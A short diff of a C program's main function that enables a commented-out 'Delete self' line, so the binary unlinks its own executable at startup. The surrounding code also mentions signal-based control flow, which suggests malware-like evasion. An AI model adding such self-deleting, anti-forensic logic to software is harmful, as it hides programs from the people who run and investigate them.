@@ -51,7 +51,7 @@ int main(int argc, char **args)
     int wfd;
 
     // Delete self
-    // unlink(args[0]);
+    unlink(args[0]);
 
     // Signal based control flow
     sigemptyset(&sigs);
